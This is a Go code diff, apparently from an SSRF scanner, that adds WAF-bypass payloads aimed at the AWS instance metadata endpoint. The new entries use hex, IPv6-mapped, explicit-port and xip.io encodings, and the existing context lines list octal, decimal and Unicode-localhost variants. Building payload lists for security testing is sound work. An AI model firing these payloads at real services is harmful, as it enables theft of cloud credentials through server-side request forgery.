@@ -381,6 +381,13 @@ var bypassPayloads = []Payload{
 	{Value: "http://[::ffff:169.254.169.254]/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IPv6 mapped", WAFBypass: true, CloudType: "aws"},
 	{Value: "http://0251.0376.0251.0376/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS octal IP", WAFBypass: true, CloudType: "aws"},
 	{Value: "http://2852039166/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS decimal IP", WAFBypass: true, CloudType: "aws"},
+	// (hex dotted octets already in standard payloads above)
+	{Value: "http://0xa9fea9fe/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS hex integer", WAFBypass: true, CloudType: "aws"},
+	{Value: "http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IPv6 full mapped", WAFBypass: true, CloudType: "aws"},
+	{Value: "http://169.254.169.254:80/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS explicit port 80", WAFBypass: true, CloudType: "aws"},
+	{Value: "http://169.254.169.254:443/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "AWS explicit port 443", WAFBypass: true, CloudType: "aws"},
+	// (GCP metadata hostname already in standard payloads above)
+	{Value: "http://169.254.169.254.xip.io/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS via xip.io", WAFBypass: true, CloudType: "aws"},
 
 	// Unicode/IDNA normalization
 	{Value: "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Unicode localhost", WAFBypass: true},
